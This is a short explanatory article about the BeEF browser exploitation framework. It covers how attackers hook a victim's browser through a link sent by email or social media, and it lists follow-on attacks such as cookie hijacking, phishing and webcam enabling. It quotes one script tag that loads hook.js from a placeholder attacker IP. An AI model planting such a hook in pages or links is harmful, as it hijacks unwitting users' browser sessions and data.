# BeEF Framework
## Introduction
According to [1][1] around 45% of Web users are not updating to the latest versions of their browsers with the up-to-date security measures, which empowers various tools to exploit their browsers and vulnerabilities. BeEF which is the short term of Browser Exploitation Framework was initiated in 2006 by Wade Alcorn is an open-source hacking and penetration testing tool, mainly to perform web browser attacks and exploit vulnerabilities using a capable and simple user interface[2]. 
## What BeEF Does?
It focuses on taking advantage of a web browser’s vulnerabilities to hijack and take control of the target. By “hooking” one or many number of browsers, the attacker starts launching various type of commands that attacks the browser and further attacks the system [3]. In order to perform an attack, the attacker generates a customized URL that includes a JavaScript hook and forwards it to the targeted user using emails, social network links and many other possible ways to open it [4].
```javascript
<script src="http://{ATTACKER’S IP}:3000/hook.js" type="text/javascript"></script>
```
Once an unaware user opens the received URL, the browser is hooked without noticing any unusual activity while the attacker accesses the user’s session. Hence, the attacker will have access to the targeted browser and will be able to launch MITM attacks, Social Engineering attacks, Phishing, Cookie Hijacking, Webcam Enabling, and many other commands.

[1]: https://writingbros.com/essay-examples/an-in-depth-look-at-browser-exploitation-using-beef-framework/
